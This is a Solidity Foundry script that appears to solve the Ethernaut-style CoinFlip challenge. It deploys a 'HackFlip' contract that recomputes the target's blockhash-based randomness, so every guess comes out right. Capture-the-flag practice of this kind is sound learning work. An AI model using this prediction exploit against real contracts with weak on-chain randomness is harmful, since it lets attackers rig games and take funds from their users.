// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/3CoinFlip.sol";

contract HackFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlip;

    constructor(address _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 num = blockValue / FACTOR;
        bool side = num == 1 ? true : false;
        require(coinFlip.flip(side), "Wrong guess, tx reverted");
    }
}

contract CoinFlipScript is Script {
    address constant CHALLENGE = 0xfd904399fA779D81E66cD10670667dD405a2a33C;
    HackFlip public hackFlip;

    function run() public {
        vm.startBroadcast(); // Starts broadcasting transactions
        hackFlip = new HackFlip(CHALLENGE);
        console.log("HackFlip deployed at:", address(hackFlip));
        vm.stopBroadcast();
    }
}
